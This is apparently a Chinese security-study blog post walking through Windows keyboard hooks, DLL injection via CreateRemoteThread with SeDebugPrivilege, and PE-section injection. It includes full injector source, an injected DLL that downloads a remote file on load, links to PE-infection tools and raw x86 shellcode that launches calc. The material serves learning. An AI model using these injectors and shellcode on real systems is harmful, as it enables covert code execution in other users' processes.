NULL;PFN_HOOKSTOPHookStop &#x3D; NULL;charch &#x3D; 0;    &#x2F;&#x2F; 加载指定的dllhDll &#x3D; LoadLibraryA(DEF_DLL_NAME);    if( hDll &#x3D;&#x3D; NULL )    &#123;        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());        return;    &#125;HookStart &#x3D; (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);HookStop &#x3D; (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);HookStart();    printf(&quot;press &#39;q&#39; to quit!\n&quot;);while( _getch() !&#x3D; &#39;q&#39; );HookStop();    FreeLibrary(hDll);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>有一些韩文注释，删掉了。看的有点点不太懂，可能需要看完dll部分才懂。</p><p>大致逻辑就是，先加载目标dll，然后利用<code>GetProcAddress</code> API获得hookstart函数的地址，这里用了强制类型转化，stop地址也是，具体内容需要看dll的实现。估计所有的简单hook都是这样实现的。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F;KeyHook#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#define DEF_PROCESS_NAME&quot;notepad.exe&quot;HINSTANCE g_hInstance &#x3D; NULL;HHOOK g_hHook &#x3D; NULL;HWND g_hWnd &#x3D; NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)&#123;switch( dwReason )&#123;        case DLL_PROCESS_ATTACH:g_hInstance &#x3D; hinstDLL;break;        case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)&#123;char szPath[MAX_PATH] &#x3D; &#123;0,&#125;;char *p &#x3D; NULL;if( nCode &gt;&#x3D; 0 )&#123;&#x2F;&#x2F; bit 31 : 0 &#x3D;&gt; press, 1 &#x3D;&gt; releaseif( !(lParam &amp; 0x80000000) )&#x2F;&#x2F;释放键盘按键时&#123;GetModuleFileNameA(NULL, szPath, MAX_PATH);p &#x3D; strrchr(szPath, &#39;\\&#39;);            &#x2F;&#x2F; 比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序（或者下一个钩子）if( !_stricmp(p + 1, DEF_PROCESS_NAME) )return 1;&#125;&#125;    &#x2F;&#x2F; 如果不是notepad.exe，则调用CallNextHookEx函数，将消息传递给应用程序return CallNextHookEx(g_hHook, nCode, wParam, lParam);&#125;#ifdef __cplusplusextern &quot;C&quot; &#123;#endif__declspec(dllexport) void HookStart()&#123;g_hHook &#x3D; SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);&#125;__declspec(dllexport) void HookStop()&#123;if( g_hHook )&#123;UnhookWindowsHookEx(g_hHook);g_hHook &#x3D; NULL;&#125;&#125;#ifdef __cplusplus&#125;#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>实现了三个部分，第一部分是dllmain函数，第二部分是主要的hook函数，第三部分是调用的接口，从HookMain可知，hook是从HookStart开始的。</p><p>了解到<code>SetWindowsHookEx</code>函数，是hook的安装函数，这里就不得不提一下hook在内存中的存在形式了。</p><p><a href="https://www.cnblogs.com/rosesmall/p/3248300.html">https://www.cnblogs.com/rosesmall/p/3248300.html</a></p><p>每一个Hook都有一个与之相关联的<a href="http://baike.baidu.com/view/159417.htm">指针</a>列表，称之为钩子<a href="http://baike.baidu.com/view/549479.htm">链表</a>，由系统来维护。这个列表的<a href="http://baike.baidu.com/view/159417.htm">指针</a>指向指定的，应用程序定义的，被Hook子程调用的<a href="http://baike.baidu.com/view/414773.htm">回调函数</a>，也就是该钩子的各个处理子程。当与指定的Hook类型关联的消息发生时，系统就把这个消息传递到Hook子程。 一些Hook子程可以只监视消息，或者修改消息，或者停止消息的前进，避免这些消息传递到下一个Hook子程或者目的窗口。最后安装的钩子放在链的开始， 而最早安装的钩子放在最后，也就是后加入的先获得控制权。</p><p>Windows 并不要求钩子子程的<a href="http://baike.baidu.com/view/386432.htm">卸载</a>顺序一定得和安装顺序相反。每当有一个钩子被<a href="http://baike.baidu.com/view/386432.htm">卸载</a>，Windows 便释放其占用的内存，并更新整个Hook链表。如果程序安装了钩子，但是在尚未<a href="http://baike.baidu.com/view/386432.htm">卸载</a>钩子之前就结束了，那么系统会自动为它做卸载钩子的操作。</p><p>SetWindowsHookEx函数总会在hook链的开头安装hook子程。当指定类型的Hook监视的事件发生时，系统就调用与这个Hook关联的 Hook链的开头的Hook子程。每一个Hook链中的Hook子程都决定是否把这个事件传递到下一个Hook子程。Hook子程传递事件到下一个 Hook子程需要调用CallNextHookEx函数。</p><p>函数原型如下：</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">HHOOK SetWindowsHookEx(int idHook, &#x2F;&#x2F; 钩子的类型，即它处理的消息类型HOOKPROC lpfn, &#x2F;&#x2F; 钩子子程的地址指针。如果dwThreadId参数为0&#x2F;&#x2F; 或是一个由别的进程创建的线程的标识，&#x2F;&#x2F; lpfn必须指向DLL中的钩子子程。&#x2F;&#x2F; 除此以外，lpfn可以指向当前进程的一段钩子子程代码。&#x2F;&#x2F; 钩子函数的入口地址，当钩子钩到任何消息后便调用这个函数。HINSTANCE hMod, &#x2F;&#x2F; 应用程序实例的句柄。标识包含lpfn所指的子程的DLL。&#x2F;&#x2F; 如果dwThreadId 标识当前进程创建的一个线程，&#x2F;&#x2F; 而且子程代码位于当前进程，hMod必须为NULL。&#x2F;&#x2F; 可以很简单的设定其为本应用程序的实例句柄。DWORD dwThreadId &#x2F;&#x2F; 与安装的钩子子程相关联的线程的标识符。&#x2F;&#x2F; 如果为0，钩子子程与所有的线程关联，即为全局钩子。);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>把我们创建的钩子函数作为入口地址，钩到消息即传递给该函数。而hook函数就是简单的，劫持notepad的消息，不往下传递，这就导致了notepad的进程按键无法被正确响应。实现了hook。</p><h3 id="dll注入代码分析"><a class="header-anchor" href="#dll注入代码分析">¶</a>dll注入代码分析</h3><p>还是看到注入代码。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;#include &quot;tchar.h&quot;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,               &amp;hToken) )    &#123;        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,           &#x2F;&#x2F; lookup privilege on local system                              lpszPrivilege,  &#x2F;&#x2F; privilege to lookup                               &amp;luid) )        &#x2F;&#x2F; receives LUID of privilege    &#123;        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount &#x3D; 1;    tp.Privileges[0].Luid &#x3D; luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes &#x3D; 0;    &#x2F;&#x2F; Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() &#x3D;&#x3D; ERROR_NOT_ALL_ASSIGNED )    &#123;        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123;    HANDLE hProcess &#x3D; NULL, hThread &#x3D; NULL;    HMODULE hMod &#x3D; NULL;    LPVOID pRemoteBuf &#x3D; NULL;    DWORD dwBufSize &#x3D; (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);    LPTHREAD_START_ROUTINE pThreadProc;    &#x2F;&#x2F; #1. dwPID notepad.exe    if ( !(hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )    &#123;        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());        return FALSE;    &#125;    &#x2F;&#x2F; #2.分配一块内存在目标进程中，用来存储dll的路径，设置权限为读写。    pRemoteBuf &#x3D; VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);    &#x2F;&#x2F; #3. 写入路径    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);    &#x2F;&#x2F; #4. LoadLibraryA() API     hMod &#x3D; GetModuleHandle(L&quot;kernel32.dll&quot;);    pThreadProc &#x3D; (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);    &#x2F;&#x2F; #5. notepad.exe     hThread &#x3D; CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;&#125;int _tmain(int argc, TCHAR *argv[])&#123;    if( argc !&#x3D; 3)    &#123;        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);        return 1;    &#125;    &#x2F;&#x2F; change privilege    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )        return 1;    &#x2F;&#x2F; inject dll    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);    else        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>看main函数的usage就知道这是一个对指定pid注入指定dll的程序。</p><p>重点看到injectdll函数，<code>SetPrivilege</code>被用来设定权限。</p><p><code>pRemoteBuf =  VirtualAllocEx(hProcess,NULL,dwBufSize,MEM_COMMIT,PAGE_READWRITE)</code>将要注入的dll路径写入目标进程内存。因为任何内存空间都无法写入，所以调用<code>VirtualAllocEx（）</code>在目标进程分配一块缓冲区，指定缓冲区大小为dll文件路径长度。同时设定权限为读写。</p><p>写入路径之后，调用了线程函数<code>hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);</code>创建远程线程，线程属于pProcess，还有一些参数，LoadLibraryW的地址和dll路径的地址。</p><p>看到dll代码</p><figure><div class="code-wrapper"><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;urlmon.lib&quot;)#define DEF_URL     (L&quot;http:&#x2F;&#x2F;www.naver.com&#x2F;index.html&quot;)#define DEF_FILE_NAME   (L&quot;index.html&quot;)HMODULE g_hMod &#x3D; NULL;DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    TCHAR szPath[_MAX_PATH] &#x3D; &#123;0,&#125;;    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )        return FALSE;    TCHAR *p &#x3D; _tcsrchr( szPath, &#39;\\&#39; );    if( !p )        return FALSE;    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);    return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    HANDLE hThread &#x3D; NULL;    g_hMod &#x3D; (HMODULE)hinstDLL;    switch( fdwReason )    &#123;    case DLL_PROCESS_ATTACH :         OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);        hThread &#x3D; CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);        CloseHandle(hThread);        break;    &#125;    return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个就比较简单了，意思就是调用指定的API下载指定的文件到指定的地点。</p><p>综上：注入的main函数，创建一个新线程加载指定路径的dll，而该dll实现远程下载的功能。</p><p>这里利用了一个Windows os下的特性，由于要使得指定的线程加载，则需要知道目标线程的API函数地址，但是在Windows中，因为OS核心dll会被加载到自身固定的地址，dll注入利用的就是window OS的这一特性。所以，导入InjectDll.exe进程中的LoadLibraryW（）地址与导入notepad.exe进程中的LoadLibraryW（）地址是相同的。</p><h2 id="0x03-实践"><a class="header-anchor" href="#0x03-实践">¶</a>0x03 实践</h2><h3 id="hook实践"><a class="header-anchor" href="#hook实践">¶</a>hook实践</h3><p>这里看到响应函数，更改为如下:</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/d8020a30306069b8.png" alt=""></p><p>弹出计算器可能效果更加直观。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/a05ba7f4c9734402.png" alt=""></p><p>进程名字改为notepad++.exe，然后使用g++编译代码。</p><p><code> g++ --share ai.cpp -o ai.dll</code></p><p>编译完毕之后，把dll和exe放在一个目录下，然后运行exe</p><p><a href="https://imgtu.com/i/jeNzFS"><img src="https://s1.ax1x.com/2022/06/28/jeNzFS.jpg" alt="jeNzFS.jpg"></a></p><p>hook成功</p><h3 id="dll实践"><a class="header-anchor" href="#dll实践">¶</a>dll实践</h3><p>同样的方式，编译代码，注意修改，使得可以弹出计算器。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/5ca74cf4d01afec0.png" alt=""></p><p>但是这边编译代码的时候出了很多问题，于是把_tprintf全部替换成了printf，且所有字符串去掉了L前缀。</p><p>按道理来讲_tprintf不应该报错才对。</p><p>之后打开notepad 查看一下进程号。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/c79a29b29937d691.png" alt=""></p><p>运行册程序注入dll。改一下代码</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/d90a487ccffa6fab.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/f4bb4a0ecd50f354.png" alt=""></p><p>成功弹出计算器。</p><h2 id="0x04-dll注入实现提权"><a class="header-anchor" href="#0x04-dll注入实现提权">¶</a>0x04 dll注入实现提权</h2><p>前面看dll注入代码的时候，有一个提权函数。这里分析一下</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/059bd42051f18c03.png" alt=""></p><p>首先打开当前进程的令牌，存储在hToken中。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/43e0fa220e4b1b89.png" alt=""></p><p>查看目标权限的上下文，存储到luid中。</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/f7e7c258d9847390.png" alt=""></p><p>用新建的tp对象替换原来的进程令牌实现权限的变化。</p><h2 id="0x05-PE注入"><a class="header-anchor" href="#0x05-PE注入">¶</a>0x05 PE注入</h2><p><a href="https://blog.csdn.net/freeking101/article/details/102752048">https://blog.csdn.net/freeking101/article/details/102752048</a></p><p>该文章对PE结构讲解十分详细。</p><p>PE（ Portable Execute）文件是Windows下可执行文件的总称，常见的有 <strong>DLL，EXE，OCX，SYS</strong> 等。它是微软在 UNIX 平台的 COFF（通用对象文件格式）基础上制作而成。<strong>最初设计用来提高程序在不同操作系统上的移植性，但实际上这种文件格式仅用在 Windows 系列操作系统下</strong>。<strong>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 PE+ 或 PE32+，是PE(PE32)的一种扩展形式（请注意不是PE64)</strong>。</p><p>PE文件的格式如下</p><p><img src="https://i.bmp.ovh/imgs/2022/06/28/3e5c77288fe4c891.png" alt=""></p><p>PE文件加载的过程如下：</p><ul><li>检查Dos header里面的PE header偏移，然后直接跳转到header</li><li>检查header是否合法，如果合法则跳转到header的尾部</li><li>header的尾部是节表，此时PE装载器会读取节表的信息，然后映射内存（虚存相关，操作系统讲过）</li><li>映射完毕之后，开始处理输入表的逻辑部分</li></ul><p>注意到文件中的节表和节</p><p><strong>节表</strong>：是 PE 文件后续节的描述，windows 根据节表的描述加载每个节。</p><p><strong>节</strong>：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义，未必是上图中的三个</p><p>**导出表 <strong>是 用来描述 模块（dll）中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过GetProcAddress函数就能动态获取到函数的地址。</strong></p><p><strong>导入表</strong> 在 PE 文件加载时，会根据这个表里的内容加载依赖的 DLL ( 模块 )，并填充所需函数的地址。</p><h3 id="注入思路"><a class="header-anchor" href="#注入思路">¶</a>注入思路</h3><p>首先了解，PE文件中导入的dll信息以结构体的形式存储在IDT中。只要将dll添加到列表尾部就可以。<strong>IMAGE_OPPTIONAL_HEADER结构体中导入表RVA即是IDT的RVA。如果内存不够，就移动IDT。</strong></p><p><a href="https://blog.csdn.net/qq_38204481/article/details/82973582">https://blog.csdn.net/qq_38204481/article/details/82973582</a> IDT结构解析</p><p>注入的手段一半有两种：</p><ul><li>寻找最大的代码空白，cave mine，将 shellcode 写入 cave 中。这种方式比较方便，缺点是只适合较小的  shellcode，windows 上的 shellcode 要比 linux 上的 shellcode 大许多，这种方式的泛用性不高。</li><li>新增 PE 节，这种方式修改 PE 文件的节头表和节，可以插入任意大小的 shellcode。</li></ul><p>PE 文件注入主要包括两个方面：</p><ul><li>编写 shellcode</li><li>注入 shellcode</li></ul><p>注入 shellcode 相对比较简单，下面介绍新增 PE 节实现 PE 注入的方法。</p><h3 id="注入实现"><a class="header-anchor" href="#注入实现">¶</a>注入实现</h3><p>思路大都是添加节之类的，这里自己没有实现，找了两个项目。</p><p><a href="https://github.com/secrary/InfectPE">https://github.com/secrary/InfectPE</a> 这个是注入pe的项目</p><p><a href="https://github.com/hasherezade/pe_to_shellcode/releases">https://github.com/hasherezade/pe_to_shellcode/releases</a> 这个很强，转化pe为shellcode</p><p><a href="https://cloud.tencent.com/developer/article/1597699">https://cloud.tencent.com/developer/article/1597699</a> 这是pe_to_shellcode的解析</p><p>pe_to_shellcode这个东西得看代码才能懂。</p><p>演示一下第一个注入项目。</p><p>手动编译了一个32位的项目</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/26b87b3f5a5c4140.png" alt=""></p><p>然后利用github项目中的exe，执行注入，注入的代码是弹出一个messagebox</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/0e334c33e4615565.png" alt=""></p><p>运行badpe</p><p><img src="https://i.bmp.ovh/imgs/2022/06/29/aee43335a77654f6.png" alt=""></p><p>点击确定之后会政策执行代码。弹计算器只需要把改代码替换为下面的shellcode即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\x50\x53\x51\x52\x56\x57\x55\x89"</span><span class="token string">"\xe5\x83\xec\x18\x31\xf6\x56\x6a"</span><span class="token string">"\x63\x66\x68\x78\x65\x68\x57\x69"</span><span class="token string">"\x6e\x45\x89\x65\xfc\x31\xf6\x64"</span><span class="token string">"\x8b\x5e\x30\x8b\x5b\x0c\x8b\x5b"</span><span class="token string">"\x14\x8b\x1b\x8b\x1b\x8b\x5b\x10"</span><span class="token string">"\x89\x5d\xf8\x31\xc0\x8b\x43\x3c"</span><span class="token string">"\x01\xd8\x8b\x40\x78\x01\xd8\x8b"</span><span class="token string">"\x48\x24\x01\xd9\x89\x4d\xf4\x8b"</span><span class="token string">"\x78\x20\x01\xdf\x89\x7d\xf0\x8b"</span><span class="token string">"\x50\x1c\x01\xda\x89\x55\xec\x8b"</span><span class="token string">"\x58\x14\x31\xc0\x8b\x55\xf8\x8b"</span><span class="token string">"\x7d\xf0\x8b\x75\xfc\x31\xc9\xfc"</span><span class="token string">"\x8b\x3c\x87\x01\xd7\x66\x83\xc1"</span><span class="token string">"\x08\xf3\xa6\x74\x0a\x40\x39\xd8"</span><span class="token string">"\x72\xe5\x83\xc4\x26\xeb\x41\x8b"</span><span class="token string">"\x4d\xf4\x89\xd3\x8b\x55\xec\x66"</span><span class="token string">"\x8b\x04\x41\x8b\x04\x82\x01\xd8"</span><span class="token string">"\x31\xd2\x52\x68\x2e\x65\x78\x65"</span><span class="token string">"\x68\x63\x61\x6c\x63\x68\x6d\x33"</span><span class="token string">"\x32\x5c\x68\x79\x73\x74\x65\x68"</span><span class="token string">"\x77\x73\x5c\x53\x68\x69\x6e\x64"</span><span class="token string">"\x6f\x68\x43\x3a\x5c\x57\x89\xe6"</span><span class="token string">"\x6a\x0a\x56\xff\xd0\x83\xc4\x46"</span><span class="token string">"\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>]]></content>
    
    
    <categories>
      
      <category>others</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>好怀百岁几回开</title>
    <link href="/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/"/>
    <url>/2022/06/25/%E5%A5%BD%E6%80%80%E7%99%BE%E5%B2%81%E5%87%A0%E5%9B%9E%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="b0ec96c9e80e113f8a042cf4db3a4cfa5f83f218cde418c1898b44f037ef460c">cc0c0f8ba411acd26894e584ac9b5fda8b1dff880871afe6e43cf0d453c5369626edc82f20db218462ab795b986be0e1e3a75c8aa2169ad7d396023f00d3a0a41178c14531e052334812dce2b1ae5ae142ee68a6bfeb66bf51666b5a727caae0066d137e16b45fc41972d9bd15692c931827903324a77bbe57cea2ba9e154f0e60621540964ec127fd35853155d01d90b332874a0627e8baca858247ff16b47e0aa378a71f11ff40d35f2748d4c240e816e0ec814ecf809fb63203b607816c1c8b9f71bd111dee70c447e1cd19427baf57220568b5d6845756fc1733e2e0385bb15c42fc3d43f448d7af0241f248a1bc0982e56228f84a96ca5a0f695a1754fdf6a78fa70b27bbce0cafe8906c2ac80ce4e6f870a0c2b58c7f21d5e113713c0f8508501836184c7125282a8b3ca9d3288e8c18bbc433c491c88570c3056765a4c52f3637d36b94f522f4741d07598a12c6170e05b4df38438659705eccc049f1e9c17e34ec060bc6bdbbb6c8cc1b6e8b4e7aa0e267f3082753fd222f64615b3dd7e1b974d48780dfda239172fdcc06ac44366a413082e8ab9d5423fd32d86ff1835372e12c3e7459cf196a8001a8a32c331d04fc205eb59c01a108882cd18c82f29dfdd2ef9389e9cdd516820d2d70743d4efa8314fd7784d1c217fca1a02d89f158a16cc2a296c20bb585a3f06d4dc75558ff78aa9e15c3037f8eadf063c2f9fa72caf167ae5f3cc7c7b4bc1793552b46798b8b719c7cdd0923cd0e79292129eb99938a3844f5101c6319876ee93b842a21e7bc3ddcf48c7da3a57f467cac9a82575bfa475c1e90485aa4740270bc9c6cfd213eac8ea17b938f28e3b676c776011c96e0ea7bcd36cd4e80da275940aa745fcacfe69d79e7ffa73798abf20a88b3b00a2100ddf4bf813cbbb370a534c2ea397bc34ebef2059093065e4ce64aa0e6b4ef31eee1000933b3fbe8957f37ae70f8df58df1660dbe76dfd908e4d2f2bc276beb3b82c27a2ff12e9550cdc1e49e95df212fdcc26c7324b41385e75145544d585dd2a5d0ca3bf600432bdd47b9907822c642d8cf220602f6e1842fb4024f50aa80f7b01ff733f638b49bdef1f5159bc93827cba3967cacdc7d350a1f0b2f2aeeb76906b5e7ca59f6224bcc5c3b7f1850d0653685aef8c5957f3e81a5bc8be428fd2ac0dac69a7654c1e3bcc04eb8ddbea81f9343adae78d67e4f676d156396334da06abf31f7ccbd26e1a2bd23fa0422e14d4b85558bc046ce14a4ba950c3c617f00650995b0f5d38ac6c31b21d07e9011998a5f41c5e7854d0aafdd768ef0e04d9b9a4217828e386f1c9fd2080662ab654d4d2538964465a47da7b33ecd52a4b0230ad20235930d74aab1beb541cf98dad488d61c5e6745771538bcda9b389f2a4b062eda503a6c95d145f23bc4774110c600c030dbd837f447df8259eecbb6eb6fa597fe55be156ed963b4c5c3d649a018b138f2772906580959af5766ae47f0bb52864aa7a2baff48c642bb15dba639986e751dfa6c2e59fb773412ade44ac103f139301cd41049a2f853384498783d078fe01681f688d8db7fa9aef7173bbd3cd5fddad8f819ce766487fc7f7bc5e5ded8cbbe04c7056b63181ea2a4ac6a2f6c0070be5550b94af727212ed28ba71c3fe89c6ed48060b516d1d16330d60529421ee57e8c4b23f44e4098eb127008b457df179304612d702739054052c163f7f2908dd8147619ae75ad2a0cea057705497ad1bfa20aae2e94c610671f1acba51b7ec8f411423bb27d6b03a3c8bb8a9972ff3b92f14cad98cac3912293590a727e72722fdcd0819237a74d453d787ac9eb22a31d0266a1413c32c2ec981f5c7699db92d6f30383565088dadc58d179c74bcfaacf5da8649311adeaa1119bfcd00c09fa99b26089b0ac2b5ebe7ab2aed7183805d2d553a46e226db387d63ebe08e2dd04e6d2f7d3990b0fe31c147c214aba30cf13cbb6aafd49d90eba04c743204d248d3eb930043e62c9ed3ad9cfee41ba9da724e7f96b5ce97f6d0d2af21f87651897121f71f6e5819395b71dbfece4015610ce93be9e5c733d16ea128e8b86e8b703adc14c54e9a9bd508c4f7245bd90f344abc914e414677946383f36e0f7cba0214dc1906bfd97e09aa09fd8c9dd765eaf4d036a277587d6a83e77057913c47d519aa7a4e47b3ea7f3c964e868b0dd169311e76578aa7aba67e05fa3c506e404ce1f2f1b16f295dccaf9867250a48ef0ff02cb0c1d0a7686e6ef24a6984f4677cbca7ba29bdc3e929b0bc3576734b278b4fa8fd3380d5d099c03e07fba56f0a15794497a048d3210f862235d6e2f8a516123e751cc2a5d7f498b2d6903a1d523ea1e1414cda393536da2077e603431ef232a31e88f2e350811b97e7bf28da71a4cc42498a78bbcc0f808c30a1b5331d3196767f19e72a616ad4c5dede82ac78c7efbaeeafa2ef209d36810a293dac20496397dc01d56a4b10f14b9e7695b90bf316b350e744b492de9aafa70097a9075554ee0b2a5a8d06d64ea04222269b234c2d4c0d2b54a48659da221fcb6dd205b318eb1cc7ece13b88563b6f627129038d04ff6a6d8322733c83c9037a55f3c8de9a44ba08cbe665bc928e7b8114c593af7fe3c87fec5ce5da9b83786f5cc65972740fea9171a9ecbc02f273a377051589a5bdf60c76e9ba408a089db9bbe826c9ce6c63a65e690a3c2ebb938a9da165e50658dae09d67887df8df813da4107d2880b61c9ffc26a60c41ff4d6a93accb9f67fd469047a75cbba4acc10a49253ee391a967b5e61edd0e26094241146d4393f519908a7e0bee45eba0c352b0ebf35088f6a646f2bf45e4410e56b13398a0ec780b3758f55c7d65f71ea08e98b81a4104f901ed7827f85a0a79b5f946408953d894152df38830e11002532918b9e8d0c20b09530c8b1dd4af8f0d185b9e447ec4f22c48cd4bda5502e4f0a30b14fadf526214ed68bc46e20e0350422654b45c92eb6787b8f071ce87831ad4cf1a4865481f3bd3a213807184118eb14df3c712b